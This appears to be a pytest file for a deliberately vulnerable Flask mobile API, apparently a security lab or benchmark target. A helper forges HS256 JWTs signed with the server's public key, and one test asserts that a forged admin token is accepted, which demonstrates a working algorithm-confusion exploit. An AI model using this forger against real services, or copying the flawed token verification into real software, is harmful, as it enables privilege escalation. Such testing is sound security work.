import json
import time
import base64
import hmac
import hashlib

import pytest


@pytest.fixture
def app():
    from app import create_app, db
    from app.core.models import User
    from werkzeug.security import generate_password_hash

    application = create_app(config_object="config.TestConfig")
    application.config["TESTING"] = True

    with application.app_context():
        db.drop_all()
        db.create_all()
        db.session.add_all([
            User(id=1, username="attacker", email="attacker@test.local",
                 password_hash=generate_password_hash("Password123!"), role="customer"),
            User(id=3, username="admin", email="admin@test.local",
                 password_hash=generate_password_hash("ChangeMe_Admin!2024"), role="admin"),
        ])
        db.session.commit()
        yield application


@pytest.fixture
def client(app):
    return app.test_client()


def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _forge_hs256_token(payload, public_key_pem):
    header = _b64url(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
    body = _b64url(json.dumps(payload).encode())
    signing_input = f"{header}.{body}".encode()
    sig = hmac.new(public_key_pem.encode(), signing_input, hashlib.sha256).digest()
    return f"{header}.{body}.{_b64url(sig)}"


def test_legit_login_and_account_lookup(client):
    resp = client.post("/api/mobile/login", json={"username": "attacker", "password": "Password123!"})
    assert resp.status_code == 200
    token = resp.get_json()["token"]

    resp = client.get("/api/mobile/account", headers={"Authorization": f"Bearer {token}"})
    assert resp.status_code == 200
    assert resp.get_json()["username"] == "attacker"


def test_customer_token_cannot_reach_admin_overview(client):
    resp = client.post("/api/mobile/login", json={"username": "attacker", "password": "Password123!"})
    token = resp.get_json()["token"]

    resp = client.get("/api/mobile/admin/overview", headers={"Authorization": f"Bearer {token}"})
    assert resp.status_code == 403


def test_alg_confusion_forged_admin_token_is_accepted(client):
    """
    THE VULNERABILITY. Attacker never learns the admin password --
    they fetch the public key, forge an HS256 token claiming
    role=admin, and the server accepts it.
    """
    public_key_pem = client.get("/api/mobile/public-key").data.decode()

    forged = _forge_hs256_token(
        {"user_id": 3, "username": "admin", "role": "admin", "exp": int(time.time()) + 3600},
        public_key_pem,
    )

    resp = client.get("/api/mobile/admin/overview", headers={"Authorization": f"Bearer {forged}"})
    assert resp.status_code == 200
    assert "internal_note" in resp.get_json()


def test_forged_token_with_wrong_secret_is_rejected(client):
    """Sanity check -- forging with a random secret (not the real
    public key) must still fail, confirming this isn't just accepting
    anything with alg=HS256."""
    forged = _forge_hs256_token(
        {"user_id": 3, "username": "admin", "role": "admin", "exp": int(time.time()) + 3600},
        "not-the-real-public-key",
    )
    resp = client.get("/api/mobile/admin/overview", headers={"Authorization": f"Bearer {forged}"})
    assert resp.status_code == 401
